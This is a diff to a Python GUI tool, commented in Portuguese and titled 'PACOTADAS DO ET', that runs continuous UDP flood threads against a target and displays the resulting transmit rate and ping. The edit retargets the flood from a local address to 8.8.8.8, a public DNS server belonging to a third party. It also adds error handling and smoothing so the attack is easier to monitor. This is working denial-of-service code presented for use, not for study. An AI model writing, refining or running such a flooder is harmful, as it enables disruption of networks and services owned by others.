@@ -4,9 +4,10 @@ import psutil
 import time
 import subprocess
 import socket
+import sys
 
 # === CONFIGURAÇÃO ===
-TARGET_IP     = "192.168.1.5"    # IP para ping e flood
+TARGET_IP     = "8.8.8.8"    # IP para ping e flood
 TARGET_PORT   = 8080           # Porta UDP para flood
 BUFFER_SIZE   = 4248        # Payload UDP sem fragmentação
 FLOOD_THREADS = 1            # Threads paralelas de flood
@@ -19,15 +20,15 @@ def flood_packets():
     while True:
         try:
             sock.sendto(data, (TARGET_IP, TARGET_PORT))
-        except:
-            time.sleep(0.0)
+        except Exception as e:
+            print(f"Erro no envio: {e}", file=sys.stderr)
+            time.sleep(0.1)
 
 # === FUNÇÃO DE PING ===
 def get_ping(ip):
     try:
         out = subprocess.run(
-            ["ping", "-n", "1", ip],
-            capture_output=True, text=True, timeout=2
+            ["ping", "-n", "1", ip], capture_output=True, text=True, timeout=2
         ).stdout
         for line in out.splitlines():
             if "tempo=" in line or "time=" in line:
@@ -36,32 +37,49 @@ def get_ping(ip):
         return "Err"
     return "T/o"
 
-# === LOOP DE MONITORAMENTO ===
+# === LOOP DE MONITORAMENTO COM EMA SMOOTHING ===
+alpha = 0.3  # fator de suavização para EMA
+ema = None   # valor inicial da média móvel exponencial
+prev_sent = None
+
 def monitor_iface():
-    prev = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
-    if not prev:
+    global prev_sent, ema
+    # iniciais
+    stats = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
+    if not stats:
         status_var.set(f"Interface '{IFACE_NAME}' não encontrada")
         return
-    prev_sent = prev.bytes_sent
+    prev_sent = stats.bytes_sent
 
     while True:
-        time.sleep(3)
+        time.sleep(1)
         stats = psutil.net_io_counters(pernic=True).get(IFACE_NAME)
+        if not stats:
+            status_var.set(f"Interface '{IFACE_NAME}' ausente")
+            break
         curr_sent = stats.bytes_sent
         delta = curr_sent - prev_sent
         prev_sent = curr_sent
 
-        mbps = (delta * 8) / 1_000_000  # converte pra megabits/s
-        ping = get_ping(TARGET_IP)
-        status_var.set(f"TX: {mbps:.1f} Mbps    Ping: {ping}")
+        # cálculo instantâneo em Mbps
+        instant_mbps = (delta * 8) / 1_000_000
+        # update EMA
+        if ema is None:
+            ema = instant_mbps
+        else:
+            ema = ema * (1 - alpha) + instant_mbps * alpha
 
-# === MONTE A GUI ===
+        ping = get_ping(TARGET_IP)
+        status_var.set(f"TX: {ema:.1f} Mbps    Ping: {ping}")
+
+# === GUI ===
 root = tk.Tk()
 root.title("PACOTADAS DO ET")
 root.geometry("400x150")
 root.resizable(False, False)
 root.configure(bg="black")
 
+# Cabeçalho
 tk.Label(
     root,
     text="PACOTADAS DO ET",
@@ -70,6 +88,7 @@ tk.Label(
     bg="black"
 ).pack(pady=10)
 
+# Status
 status_var = tk.StringVar(value="Inicializando...")
 tk.Label(
     root,
@@ -79,10 +98,11 @@ tk.Label(
     bg="black"
 ).pack()
 
-# === INICIA THREADS ===
+# Inicia threads de flood
 for _ in range(FLOOD_THREADS):
     threading.Thread(target=flood_packets, daemon=True).start()
 
+# Inicia thread de monitoramento
 threading.Thread(target=monitor_iface, daemon=True).start()
 
 root.mainloop()
